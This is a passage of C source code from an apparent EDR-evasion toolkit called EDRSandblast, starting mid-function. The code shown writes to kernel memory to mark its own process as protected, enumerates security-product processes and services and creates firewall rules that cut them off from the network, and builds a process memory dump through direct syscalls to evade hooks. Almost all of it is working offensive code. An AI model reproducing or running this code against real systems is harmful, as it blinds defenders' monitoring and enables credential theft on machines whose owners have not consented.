        _putts_or_not(TEXT("[!] ERROR: could not open an handle to ntdll to find the EPROCESS struct of the current process"));
        return 0x0;
    }
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) {
        _putts_or_not(TEXT("[!] ERROR: could not retrieve NtQuerySystemInformation function to find the EPROCESS struct of the current process"));
        return 0x0;
    }

    /*
    * Retrieves all the handle table using NtQuerySystemInformation.
    * Looping until NtQuerySystemInformation has sufficient space to do so (i.e does not return a STATUS_INFO_LENGTH_MISMATCH).
    * Possible alternative to explore woule be to use the ReturnLength returned by NtQuerySystemInformation.
    */
    ULONG SystemHandleInformationSize = SystemHandleInformationBaseSize;
    PSYSTEM_HANDLE_INFORMATION tmpHandleTableInformation = NULL;
    PSYSTEM_HANDLE_INFORMATION pHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(SystemHandleInformationSize);
    if (!pHandleTableInformation) {
        _putts_or_not(TEXT("[!] ERROR: could not allocate memory for the handle table to find the EPROCESS struct of the current process"));
        return 0x0;
    }
    status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        SystemHandleInformationSize = SystemHandleInformationSize * 2;
        tmpHandleTableInformation = (PSYSTEM_HANDLE_INFORMATION)realloc(pHandleTableInformation, SystemHandleInformationSize);
        if (!tmpHandleTableInformation) {
            _putts_or_not(TEXT("[!] ERROR: could not realloc memory for the handle table to find the EPROCESS struct of the current process"));
            return 0x0;
        }
        pHandleTableInformation = tmpHandleTableInformation;
        status = NtQuerySystemInformation(SystemHandleInformation, pHandleTableInformation, SystemHandleInformationSize, NULL);
    }
    if (!NT_SUCCESS(status)) {
        _putts_or_not(TEXT("[!] ERROR: could not retrieve the HandleTableInformation to find the EPROCESS struct of the current process"));
        return 0x0;
    }

    // Iterates through all the handles.
    DWORD64 returnAddress = 0x0;
    for (DWORD i = 0; i < pHandleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleTableInformation->Handles[i];

        // Only retrieves the handles associated with our own process.
        if (handleInfo.UniqueProcessId != currentProcessID) {
            continue;
        }

        if (handleInfo.HandleValue == (USHORT)((ULONG_PTR)selfProcessHandle)) {
            _tprintf_or_not(TEXT("[+] [ProcessProtection] Found the handle of the current process (PID: %hu): 0x%hx at 0x%I64x\n"), handleInfo.UniqueProcessId, handleInfo.HandleValue, (DWORD64)handleInfo.Object);
            returnAddress = (DWORD64)handleInfo.Object;
            break;
        }
    }
    free(pHandleTableInformation);
    CloseHandle(selfProcessHandle);
    return returnAddress;
}

int SetCurrentProcessAsProtected(BOOL verbose) {
    DWORD64 processEPROCESSAddress = GetSelfEPROCESSAddress(verbose);
    if (processEPROCESSAddress == 0x0) {
        _putts_or_not(TEXT("[!] ERROR: could not find the EPROCCES struct of the current process to self protect"));
        return -1;
    }
    _tprintf_or_not(TEXT("[+] [ProcessProtection] Found self process EPROCCES struct at 0x%I64x\n"), processEPROCESSAddress);

    // Sets the current process EPROCESS's ProtectionLevel as Light WinTcb (PS_PROTECTED_WINTCB_LIGHT, currently 0x61).
    DWORD64 processSignatureLevelAddress = processEPROCESSAddress + g_ntoskrnlOffsets.st.eprocess_protection;
    // DWORD64 processSignatureLevelAddress = 0xffffe481d073a080 + offsets.st.eprocess_protection;

    UCHAR flagPPLWinTcb = ((UCHAR)((PsProtectedSignerWinTcb) << 4)) | ((UCHAR)(PsProtectedTypeProtectedLight));
    _tprintf_or_not(TEXT("[*] [ProcessProtection] Protecting own process by setting the EPROCESS's ProtectionLevel (at 0x%I64x) to 0x%hx (PS_PROTECTED_WINTCB_LIGHT)\n"), processSignatureLevelAddress, flagPPLWinTcb);
    WriteMemoryWORD(processSignatureLevelAddress, flagPPLWinTcb);

    return 0;
}
```

`EDRSandblast/UserlandBypass/Firewalling.c`:

```c
/*

--- Firewall rules to block EDR products from the network (inboud / outbound connections).

*/
#include "../EDRSandblast.h"
#include "Firewalling.h"

HRESULT FirewallBlockEDRBinaries(fwBlockingRulesList* sFWEntries) {
    HRESULT hrStatus = S_OK;

    // Create the Firewall blocking rules.
    for (fwBinaryRules* slistNewFWEntry = sFWEntries->first; slistNewFWEntry != NULL; slistNewFWEntry=slistNewFWEntry->next) {
        slistNewFWEntry->ruleInboundName = (TCHAR*) calloc(FW_RULE_NAME_MAX_LENGTH + 1, sizeof(TCHAR));
        slistNewFWEntry->ruleOutboundName = (TCHAR*) calloc(FW_RULE_NAME_MAX_LENGTH + 1, sizeof(TCHAR));
        if (!(slistNewFWEntry->ruleInboundName && slistNewFWEntry->ruleOutboundName)) {
            _tprintf_or_not(TEXT("[!] Could not allocate memory to create Firewall blocking rules for \"%s\"\n"), slistNewFWEntry->binaryPath);
            return 1;
        }

        hrStatus = CreateFirewallRuleBlockBinary(slistNewFWEntry->binaryPath, NET_FW_RULE_DIR_IN, slistNewFWEntry->ruleInboundName);
        if (FAILED(hrStatus)) {
            _tprintf_or_not(TEXT("[!] Error while creating the Firewall inbound blocking rule for \"%s\" (CreateFirewallRuleBlockBinary failed: 0x%08lx)\n"), slistNewFWEntry->binaryPath, hrStatus);
        }
        else {
            _tprintf_or_not(TEXT("[+] Successfully created Firewall inbound blocking rule \"%s\" for \"%s\"\n"), slistNewFWEntry->ruleInboundName, slistNewFWEntry->binaryPath);
        }

        hrStatus = CreateFirewallRuleBlockBinary(slistNewFWEntry->binaryPath, NET_FW_RULE_DIR_OUT, slistNewFWEntry->ruleOutboundName);
        if (FAILED(hrStatus)) {
            _tprintf_or_not(TEXT("[!] Error while creating the Firewall outbound blocking rule for \"%s\" (failed with: 0x%08lx)\n"), slistNewFWEntry->binaryPath, hrStatus);
        }
        else {
            _tprintf_or_not(TEXT("[+] Successfully created Firewall outbound blocking rule \"%s\" for \"%s\"\n"), slistNewFWEntry->ruleOutboundName, slistNewFWEntry->binaryPath);
        }
    }

    return hrStatus;
}

// Enumerates the process, retrieves their associated binary path, and configures Firewall blocking network inbound / outbound access for binaries associated with EDR products.
NTSTATUS EnumEDRProcess(fwBlockingRulesList* sFWEntries) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    TCHAR binaryPath[MAX_PATH];
    DWORD szBinaryPath = _countof(binaryPath);

    fwBinaryRules* slistNewFWEntry = NULL;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        _putts_or_not(TEXT("[!] Could not get a snapshot of the system's processes (CreateToolhelp32Snapshot)"));
        return -1;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        _putts_or_not(TEXT("[!] Could not retrieve information about the first process (Process32First)"));
        goto cleanup;
    }

    do {
        if (pe32.th32ProcessID == 0) {
            continue;
        }

        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
            _tprintf_or_not(TEXT("[*] Couldn't open handle on process (OpenProcess with PROCESS_QUERY_LIMITED_INFORMATION) %ld\n"), pe32.th32ProcessID);
            continue;
        }

        szBinaryPath = _countof(binaryPath);
        if (!QueryFullProcessImageName(hProcess, 0, binaryPath, &szBinaryPath)) {
            _tprintf_or_not(TEXT("[*] Couldn't query image information of process with PID %ld (QueryFullProcessImageName failed with 0x%x)\n"), pe32.th32ProcessID, GetLastError());
            CloseHandle(hProcess);
            continue;
        }

        if (isFileSignatureMatchingEDR(binaryPath) || isBinaryPathMatchingEDR(binaryPath)) {
            slistNewFWEntry = calloc(1, sizeof(fwBinaryRules));
            if (!slistNewFWEntry) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path for process with PID %ld (slistNewEntry)\n"), pe32.th32ProcessID);
                goto cleanup;
            }

            slistNewFWEntry->binaryPath = _tcsdup(binaryPath);
            if (!slistNewFWEntry->binaryPath) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path for process with PID %ld (slistNewEntry->binaryPath)\n"), pe32.th32ProcessID);
                goto cleanup;
            }
            fwList_insertSorted(sFWEntries, slistNewFWEntry);
            _tprintf_or_not(TEXT("[+] Found EDR binary in execution (process with PID %i): \"%s\"\n"), pe32.th32ProcessID, slistNewFWEntry->binaryPath);
        }

        CloseHandle(hProcess);
        hProcess = INVALID_HANDLE_VALUE;
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return 0;

cleanup:
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcessSnap);
    }

    if (hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }

    return -1;
}

// Enumerates the Windows services, retrieves their associated binary path, and configures Firewall blocking network inbound / outbound access for binaries associated with EDR products.
NTSTATUS EnumEDRServices(fwBlockingRulesList* sFWEntries) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    ENUM_SERVICE_STATUS_PROCESS* lpServices = NULL;
    QUERY_SERVICE_CONFIG* lpServiceConfig = 0;
    TCHAR serviceBinaryPath[MAX_PATH];
    TCHAR serviceBinaryPathCopy[MAX_PATH];
    DWORD lpServicesCount = 0;
    DWORD dwByteCount = 0, dwBytesNeeded = 0;
    DWORD dwError = 0;
    BOOL returnValue;

    fwBinaryRules* slistNewFWEntry = NULL;

    // Open an handle on the Service Control Manager.
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hSCManager) {
        _tprintf_or_not(TEXT("[!] Error while opening handle on the SCM (OpenSCManager failed: 0x%08lx)\n"), GetLastError());
        return 1;
    }

    // Query services through the Service Control Manager, first call always fail due to insufficient buffer size.
    do {
        if (lpServices) {
            free(lpServices);
            lpServices = NULL;
        }

        dwByteCount = dwByteCount + dwBytesNeeded;
        lpServices = (ENUM_SERVICE_STATUS_PROCESS*)calloc(dwByteCount, sizeof(BYTE));
        if (!lpServices) {
            _putts_or_not(TEXT("[!] Failed to allocate memory to enumerate services"));
            goto cleanup;
        }

        returnValue = EnumServicesStatusEx(hSCManager, SC_ENUM_PROCESS_INFO, SERVICE_DRIVER | SERVICE_FILE_SYSTEM_DRIVER | SERVICE_KERNEL_DRIVER | SERVICE_WIN32 | SERVICE_WIN32_OWN_PROCESS | SERVICE_WIN32_SHARE_PROCESS, SERVICE_STATE_ALL, (LPBYTE)lpServices, dwByteCount, &dwBytesNeeded, &lpServicesCount, NULL, NULL);
        if (!returnValue) {
            dwError = GetLastError();
        }
        else {
            dwError = 0;
        }
    } while (dwError == ERROR_MORE_DATA);

    if (dwError != ERROR_SUCCESS) {
        _tprintf_or_not(TEXT("[!] Could not enumerate EDR services (EnumServicesStatusEx failed: 0x%08lx)\n"), dwError);
        goto cleanup;
    }

    for (DWORD dwIndex = 0; dwIndex < lpServicesCount; dwIndex++) {
        dwByteCount = 0;
        dwBytesNeeded = 0;

        hService = OpenService(hSCManager, lpServices[dwIndex].lpServiceName, SERVICE_QUERY_CONFIG);
        if (!hService) {
            _tprintf_or_not(TEXT("[!] Could not open handle on service \"%s\" (\"%s\")\n"), lpServices[dwIndex].lpServiceName, lpServices[dwIndex].lpDisplayName);
            continue;
        }

        do {
            if (lpServiceConfig) {
                free(lpServiceConfig);
                lpServiceConfig = NULL;
            }
            
            lpServiceConfig = (QUERY_SERVICE_CONFIG*)calloc(dwBytesNeeded, sizeof(BYTE));
            if (!lpServiceConfig) {
                _putts_or_not(TEXT("[!] Failed to allocate memory to retrieve service configuration"));
                goto cleanup;
            }
            dwByteCount = dwBytesNeeded;

            returnValue = QueryServiceConfig(hService, lpServiceConfig, dwByteCount, &dwBytesNeeded);
            if (!returnValue) {
                dwError = GetLastError();
            }
            else {
                dwError = 0;
            }
        } while (dwError == ERROR_INSUFFICIENT_BUFFER);

        if (dwError != 0) {
            _tprintf_or_not(TEXT("[!] Could not query information of service \"%s\" (\"%s\") (QueryServiceConfig failed: 0x%08lx)\n"), lpServices[dwIndex].lpServiceName, lpServices[dwIndex].lpDisplayName, dwError);
            continue;
        }

        // If binary path is empty, skip service.
        if (lpServiceConfig->lpBinaryPathName[0] == '\0') {
            continue;
        }
        _tcscpy_s(serviceBinaryPathCopy, _countof(serviceBinaryPathCopy), lpServiceConfig->lpBinaryPathName);
        
        // replace \SystemRoot\ with %systemroot%\ 
        TCHAR* prefix = TEXT("\\SystemRoot\\");
        SIZE_T prefix_len = _tcslen(prefix);
        if (!_tcsnicmp(serviceBinaryPathCopy, prefix, prefix_len)) {
            serviceBinaryPathCopy[0] = '%';
            SIZE_T sizeDisplacement = sizeof(TCHAR) * (_tcslen(serviceBinaryPathCopy) + 1 - (prefix_len - 1));
            memmove(&serviceBinaryPathCopy[prefix_len], &serviceBinaryPathCopy[prefix_len - 1], sizeDisplacement);
            serviceBinaryPathCopy[prefix_len - 1] = '%';
        }

        // Remove \\??\\ 
        prefix = TEXT("\\??\\");
        prefix_len = _tcslen(prefix);
        if (!_tcsnicmp(serviceBinaryPathCopy, prefix, prefix_len)) {
            SIZE_T sizeDisplacement = sizeof(TCHAR) * (_tcslen(serviceBinaryPathCopy) + 1 - (prefix_len));
            memmove(&serviceBinaryPathCopy[0], &serviceBinaryPathCopy[prefix_len], sizeDisplacement);
        }
        
        // insert %systemroot%\ before system32\ 
        prefix = TEXT("system32");
        prefix_len = _tcslen(prefix);
        if (!_tcsnicmp(serviceBinaryPathCopy, prefix, prefix_len)) {
            SIZE_T sizeDisplacement = sizeof(TCHAR) * (_tcslen(serviceBinaryPathCopy) + 1);
            const TCHAR * new_prefix = TEXT("%SystemRoot%\\");
            SIZE_T new_prefix_len = _tcslen(new_prefix);
            memmove(&serviceBinaryPathCopy[new_prefix_len], &serviceBinaryPathCopy[0], sizeDisplacement);
            memcpy(serviceBinaryPathCopy, new_prefix, new_prefix_len * sizeof(TCHAR));
        }

        // Remove double quotes (replace "xxxxx" with xxxxx).
        TCHAR * positionSpace = NULL;
        if (serviceBinaryPathCopy[0] == '"') {
            TCHAR * positionSecondQuote = _tcschr(&serviceBinaryPathCopy[1], '"');
            memmove(&serviceBinaryPathCopy[0], &serviceBinaryPathCopy[1], sizeof(TCHAR) * (positionSecondQuote - &serviceBinaryPathCopy[1]));
            positionSecondQuote[-1] = '\0';
        }
        else
            // Rermove arguments (replace driver.sys -qsdq azkeaze to driver.sys).
            if ((positionSpace = _tcschr(serviceBinaryPathCopy, ' ')) != NULL) {
                *positionSpace = '\0';
        }
        
        returnValue = ExpandEnvironmentStrings(serviceBinaryPathCopy, serviceBinaryPath, _countof(serviceBinaryPath));
        if (!returnValue) {
            _tprintf_or_not(TEXT("[!] Error while attempting to expand service binary path \"%s\" (ExpandEnvironmentStrings failed: : 0x%08lx)\n"), serviceBinaryPathCopy, GetLastError());
            goto cleanup;
        }

        // check if resulting path is a file, and if it's not missing its extension
        if (GetFileAttributes(serviceBinaryPath) == INVALID_FILE_ATTRIBUTES) {
            SIZE_T posExtension = _tcslen(serviceBinaryPath);
            _tcscpy_s(serviceBinaryPath + posExtension, _countof(serviceBinaryPath) - posExtension, TEXT(".exe"));
            if (GetFileAttributes(serviceBinaryPath) == INVALID_FILE_ATTRIBUTES) {
                _tcscpy_s(serviceBinaryPath + posExtension, _countof(serviceBinaryPath) - posExtension, TEXT(".sys"));
                if (GetFileAttributes(serviceBinaryPath) == INVALID_FILE_ATTRIBUTES) {
                    _tprintf_or_not(TEXT("[!] Did not find service binary '%s' (sanitized path: '%s')\n"), lpServiceConfig->lpBinaryPathName, serviceBinaryPath);
                    // NB : If unquoted service path -> should also print this error message
                    continue;
                }
            }
        }

        if (isFileSignatureMatchingEDR(serviceBinaryPath) || isDriverPathMatchingEDR(serviceBinaryPath)) {
            slistNewFWEntry = calloc(1, sizeof(fwBinaryRules));
            if (!slistNewFWEntry) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path (slistNewEntry) for service \"%s\"\n"), lpServices[dwIndex].lpServiceName);
                goto cleanup;
            }

            slistNewFWEntry->binaryPath = _tcsdup(serviceBinaryPath);
            if (!slistNewFWEntry->binaryPath) {
                _tprintf_or_not(TEXT("[!] Couldn't alloc memory for binary path (slistNewEntry->binaryPath) for service \"%s\"\n"), lpServices[dwIndex].lpServiceName);
                goto cleanup;
            }

            fwList_insertSorted(sFWEntries, slistNewFWEntry);
            _tprintf_or_not(TEXT("[+] Found EDR binary executed through a service name \"%s\" | path \"%s\"\n"), lpServices[dwIndex].lpServiceName, slistNewFWEntry->binaryPath);
        }

         if (!CloseServiceHandle(hService)) {
             _tprintf_or_not(TEXT("[!] Error while closing service handle (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
             goto cleanup;
         }

        //_tprintf_or_not(TEXT("[*] Found service: name => \"%s\" | Display name => \"%s\".\n"), lpServices[dwIndex].lpServiceName, lpServices[dwIndex].lpDisplayName);
    }
    
    if (!CloseServiceHandle(hSCManager)) {
        _tprintf_or_not(TEXT("[!] Error while closing handle on the SCM (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
    }

    free(lpServiceConfig);
    lpServiceConfig = NULL;
    free(lpServices);
    lpServices = NULL;

    return 0;

cleanup:
    if (hService) {
        if (!CloseServiceHandle(hService)) {
            _tprintf_or_not(TEXT("[!] Error while closing service handle (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
        }
    }

    if (hSCManager) {
        if (!CloseServiceHandle(hSCManager)) {
            _tprintf_or_not(TEXT("[!] Error while closing handle on the SCM (CloseServiceHandle failed: 0x%08lx)\n"), GetLastError());
        }
    }

    if (lpServiceConfig) {
        free(lpServiceConfig);
        lpServiceConfig = NULL;
    }

    if (lpServices) {
        free(lpServices);
        lpServices = NULL;
    }

    return -1;
}


HRESULT FirewallBlockEDR(fwBlockingRulesList* sFWEntries) {
    BOOL isElevatedProcess = FALSE;
    BOOL firewallIsOn = FALSE;
    DWORD ntStatus = 0;
	HRESULT hrStatus = S_OK;

    isElevatedProcess = IsElevatedProcess();
    if (!isElevatedProcess) {
        _putts_or_not(TEXT("[!] The current process is not elevated, will not be able to add Firewall rules"));
        return E_FAIL;
    }

	hrStatus = IsFirewallEnabled(&firewallIsOn);
	if (FAILED(hrStatus)) {
        _putts_or_not(TEXT("[!] Could not configure Firewall EDR blocking rules: an error occured while attempting to determine the FireWall status"));
		return E_FAIL;
	}

	if (!firewallIsOn) {
        _putts_or_not(TEXT("[*] The Windows Firewall is NOT active for all active profiles, skipping adding Firewall rules"));
		return E_FAIL;
	}
    _putts_or_not(TEXT("[+] The Windows Firewall is on for all active profiles!"));

    _putts_or_not(TEXT("[*] Enumerating EDR processes.."));
    ntStatus = EnumEDRProcess(sFWEntries);
    if (!NT_SUCCESS(ntStatus)) {
        _putts_or_not(TEXT("[!] An error occured while enumerating the EDR processes"));
    }
    _putts_or_not(TEXT(""));

    _putts_or_not(TEXT("[*] Enumerating EDR services.."));
    ntStatus = EnumEDRServices(sFWEntries);
    if (!NT_SUCCESS(ntStatus)) {
        _putts_or_not(TEXT("[!] An error occured while enumerating the EDR services"));
    }
    _putts_or_not(TEXT(""));

    _putts_or_not(TEXT("[*] Blocking EDR found processes / services's binaries..."));
    hrStatus = FirewallBlockEDRBinaries(sFWEntries);
    if (FAILED(hrStatus)) {
        _putts_or_not(TEXT("[!] An error occured while attempting to create Firewall blocking rules for EDR processes / services"));
    }
        
	return 0;
}

HRESULT FirewallUnblockEDR(fwBlockingRulesList* sFWEntries) {
    BOOL isElevatedProcess = FALSE;
    HRESULT hrStatusFinal = S_OK;
    HRESULT hrStatusTemp = S_OK;

    isElevatedProcess = IsElevatedProcess();
    if (!isElevatedProcess) {
        _putts_or_not(TEXT("[!] The current process is not elevated, will not be able to remove Firewall rules"));
        return E_FAIL;
    }

    for (fwBinaryRules* fwEntryToDelete = sFWEntries->first; fwEntryToDelete != NULL; fwEntryToDelete = fwEntryToDelete->next) {
        hrStatusTemp = DeleteFirewallRule(fwEntryToDelete->ruleInboundName);
        if (FAILED(hrStatusTemp)) {
            hrStatusFinal = hrStatusTemp;
        }

        hrStatusTemp = DeleteFirewallRule(fwEntryToDelete->ruleOutboundName);
        if (FAILED(hrStatusTemp)) {
            hrStatusFinal = hrStatusTemp;
        }
    }

    return hrStatusFinal;
}

void FirewallPrintManualDeletion(fwBlockingRulesList* sFWEntries) {
    _putts_or_not(TEXT("[*] The Firewall blocking rules created can be manually deleted using the following commands:"));

    for (fwBinaryRules* fwEntryToDelete = sFWEntries->first; fwEntryToDelete != NULL; fwEntryToDelete = fwEntryToDelete->next) {
        _tprintf_or_not(TEXT("netsh advfirewall firewall delete rule name=%s\n"), fwEntryToDelete->ruleInboundName);
        _tprintf_or_not(TEXT("netsh advfirewall firewall delete rule name=%s\n"), fwEntryToDelete->ruleOutboundName);
    }
}

BOOL fwList_isEmpty(fwBlockingRulesList* fwEntries) {
    return fwEntries->first == NULL;
};

BOOL fwListElt_isBefore(fwBinaryRules* a, fwBinaryRules* b) {
    return _tcscmp(a->binaryPath, b->binaryPath) < 0;
};

void fwList_insertSorted(fwBlockingRulesList* fwEntries, fwBinaryRules* newFWEntry) {
    fwBinaryRules* first = fwEntries->first;
    // if first element comes after, insert at the head
    if (fwList_isEmpty(fwEntries) || fwListElt_isBefore(newFWEntry, first)) {
        // insert newFWEntry at the head of the list
        newFWEntry->next = fwEntries->first;
        fwEntries->first = newFWEntry;
        return;
    }

    // browse list from the start until next element comes after (or is equal to) our new element
    fwBinaryRules* ptr;
    for (ptr = fwEntries->first;
        (ptr->next != NULL) && fwListElt_isBefore(ptr->next, newFWEntry);
        ptr = ptr->next);
    // if end of the list, or new entry is different to the next one (no duplicate), insert it
    if ((ptr->next == NULL) || fwListElt_isBefore(newFWEntry, ptr->next)) {
        // insert newFWEntry after ptr
        newFWEntry->next = ptr->next;
        ptr->next = newFWEntry;
    }
    else {
        // duplicate entry, do nothing
    }
}
```

`EDRSandblast/UserlandBypass/ProcessDumpDirectSyscalls.c`:

```c
#include <Windows.h>
#include <minidumpapiset.h>

#include "ListUtils.h"
#include "RemotePEBBrowser.h"
#include "StringUtils.h"
#include "SyscallProcessUtils.h"
#include "SW2_Syscalls.h"
#include "Undoc.h"

#include "ProcessDumpDirectSyscalls.h"

VOID writeAtRVA(DUMP_CONTEXT* dumpContext, ULONG32 rva, const PVOID data, unsigned size) {
    memcpy(GetRVA((ULONG_PTR) dumpContext->BaseAddress, rva), data, size);
}

BOOL appendToDump(DUMP_CONTEXT* dumpContext, const PVOID data, DWORD size) {
    ULONG32 newRVA = dumpContext->RVA + size;
    if (newRVA < dumpContext->RVA) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: exceeds the 32-bit address space (int overflow)\n"));
        return FALSE;
    }
    else if (dumpContext->DumpMaxSize < newRVA) {
        while(dumpContext->DumpMaxSize < newRVA){
            dumpContext->DumpMaxSize *= 2;
        }
        PVOID ptr = realloc(dumpContext->BaseAddress, dumpContext->DumpMaxSize);
        if (!ptr) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: reallocation failed\n"));
            return FALSE;
        }
        dumpContext->BaseAddress = ptr;
    }

    writeAtRVA(dumpContext, dumpContext->RVA, data, size);
    dumpContext->RVA = newRVA;
    return TRUE;
    
}

BOOL writeMiniDumpHeader(DUMP_CONTEXT* dumpContext) {
    MINIDUMP_HEADER header = { 0 };
    header.Signature = dumpContext->Signature;
    header.Version = dumpContext->Version | (((DWORD)dumpContext->ImplementationVersion)<<16);
    // Only SystemInfoStream, ModuleListStream and Memory64ListStream streams.
    header.NumberOfStreams = 3;
    header.NumberOfStreams = (header.NumberOfStreams + 3) & ~3; // round up to next multiple of 4, https://github.com/w1u0u1/minidump/blob/main/minidump/minidump.c ?
    header.StreamDirectoryRva = sizeof(MINIDUMP_HEADER);
    header.CheckSum = 0;
    header.Reserved = 0;
    header.TimeDateStamp = 0;
    header.Flags = MiniDumpWithFullMemory;

    if (!appendToDump(dumpContext, &header, sizeof(MINIDUMP_HEADER))) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: failed to write dump header\n"));
        return STATUS_UNSUCCESSFUL;
    }

    return STATUS_SUCCES;
}

DWORD writeMiniDumpDirectories(DUMP_CONTEXT* dumpContext) {
    DWORD nbDirectories = 0;

    MINIDUMP_DIRECTORY systemInfoDirectory = { 0 };
    systemInfoDirectory.StreamType = SystemInfoStream;
    systemInfoDirectory.Location.DataSize = 0;
    systemInfoDirectory.Location.Rva = 0;
    if (!appendToDump(dumpContext, &systemInfoDirectory, sizeof(systemInfoDirectory))) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write SystemInfoStream directory\n"));
        return STATUS_UNSUCCESSFUL;
    }
    nbDirectories++;

    MINIDUMP_DIRECTORY moduleListDirectory = { 0 };
    moduleListDirectory.StreamType = ModuleListStream;
    moduleListDirectory.Location.DataSize = 0;
    moduleListDirectory.Location.Rva = 0;
    if (!appendToDump(dumpContext, &moduleListDirectory, sizeof(moduleListDirectory)))
    {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write ModuleListStream directory\n"));
        return STATUS_UNSUCCESSFUL;
    }
    nbDirectories++;

    MINIDUMP_DIRECTORY memory64ListDumpDirectory = { 0 };
    memory64ListDumpDirectory.StreamType = Memory64ListStream;
    memory64ListDumpDirectory.Location.DataSize = 0;
    memory64ListDumpDirectory.Location.Rva = 0;
    if (!appendToDump(dumpContext, &memory64ListDumpDirectory, sizeof(memory64ListDumpDirectory))) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write Memory64ListStream directory\n"));
        return STATUS_UNSUCCESSFUL;
    }
    nbDirectories++;

    while (nbDirectories & 3) {
        MINIDUMP_DIRECTORY unusedDirectory = { 0 };
        unusedDirectory.StreamType = UnusedStream;
        unusedDirectory.Location.DataSize = 0;
        unusedDirectory.Location.Rva = 0;

        if (!appendToDump(dumpContext, &unusedDirectory, sizeof(unusedDirectory))) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write unusedDirectory directory\n"));
            return STATUS_UNSUCCESSFUL;
        }
        nbDirectories++;
    }

    return STATUS_SUCCES;
}

DWORD writeMiniDumpSystemInfoStream(DUMP_CONTEXT* dumpContext) {
    MINIDUMP_SYSTEM_INFO dumpSystemInfo = { 0 };

    // read the PEB.
#if _WIN64
    PEB64 peb = *(PPEB64) __readgsqword(0x60);
#else
    PEB peb = *(PPEB) __readfsdword(0x30);
#endif
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    dumpSystemInfo.ProcessorLevel = sysInfo.wProcessorLevel;
    dumpSystemInfo.ProcessorRevision = sysInfo.wProcessorRevision;
    dumpSystemInfo.NumberOfProcessors = (BYTE)sysInfo.dwNumberOfProcessors;
    dumpSystemInfo.ProductType = VER_NT_WORKSTATION;

    dumpSystemInfo.MajorVersion = peb.OSMajorVersion;
    dumpSystemInfo.MinorVersion = peb.OSMinorVersion;
    dumpSystemInfo.BuildNumber = peb.OSBuildNumber;
    dumpSystemInfo.PlatformId = peb.OSPlatformId;
    dumpSystemInfo.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
    dumpSystemInfo.CSDVersionRva = 0;
    dumpSystemInfo.SuiteMask = VER_SUITE_SINGLEUSERTS;
    dumpSystemInfo.Reserved2 = 0;
    dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] = 0;
    dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[1] = 0;

    for (DWORD i = 0; i < sizeof(dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0]) * 8; i++) {
        if (IsProcessorFeaturePresent(i)) {
            dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] |= 1LL << i;
        }
    }

    RVA streamRVA = dumpContext->RVA;
    ULONG32 streamSize = sizeof(dumpSystemInfo);
    if (!appendToDump(dumpContext, &dumpSystemInfo, streamSize)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the SystemInfoStream (stream rva)\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // Append CSDVersion string
#if _WIN64
    ULONG32 CSDVersionLength = peb.CSDVersion.uOrDummyAlign.u.Length;
#else
    ULONG32 CSDVersionLength = peb.CSDVersion.Length;
#endif
    ULONG32 CSDVersionBufferLength = CSDVersionLength + sizeof(WCHAR);
    PMINIDUMP_STRING CSDVersion = calloc(1, sizeof(MINIDUMP_STRING) + CSDVersionBufferLength);
    if (!CSDVersion) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't allocate CSDVersion string\n"));
        return STATUS_UNSUCCESSFUL;
    }
    CSDVersion->Length = CSDVersionLength;
    memcpy(CSDVersion->Buffer, peb.CSDVersion.Buffer, CSDVersionBufferLength);
    RVA CSDVersionRVA = dumpContext->RVA;
    appendToDump(dumpContext, CSDVersion, sizeof(MINIDUMP_STRING) + CSDVersionBufferLength);
    
    // write our length in the MiniDumpSystemInfo directory
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + offsetof(MINIDUMP_DIRECTORY, Location.DataSize), &streamSize, sizeof(streamSize));

    // write our RVA in the MiniDumpSystemInfo directory
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + offsetof(MINIDUMP_DIRECTORY, Location.Rva), &streamRVA, sizeof(streamRVA));

